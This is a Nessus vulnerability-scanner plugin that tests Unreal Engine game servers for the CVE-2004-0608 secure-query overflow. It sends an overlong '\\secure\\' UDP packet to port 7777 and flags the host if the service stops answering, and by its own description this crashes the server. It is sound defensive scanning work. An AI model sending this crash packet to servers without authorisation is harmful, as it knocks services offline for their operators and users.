#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12285);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2004-0608");
 script_bugtraq_id(10570);
 script_xref(name:"OSVDB", value:"7217");

 script_name(english:"Unreal Engine Secure Query Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that may arbitrary code
execution on the remote system." );
 script_set_attribute(attribute:"description", value:
"The remote host was running a game server with the Unreal 
Engine on it. The game server is vulnerable to a remote attack
which allows for arbitrary code execution.

*** Note that Nessus disabled this service by testing for this flaw." );
 script_set_attribute(attribute:"solution", value:
"Epic has released a patch for this issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();


 script_summary(english:"Crashes the remote Unreal Engine Game Server");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 exit(0);
}


port = 7777;
init = string("\\status\\");
malpacket = string("\\secure\\", crap(data:"a", length:1024) );

soc = open_sock_udp(port);

send(socket:soc, data:init);
r = recv(socket:soc, length:128);
if (r)
{
	send(socket:soc, data:malpacket);
	r = recv(socket:soc, length:128);
	if (! r)
	{
		security_hole(port);
		exit(0);
	}
}	
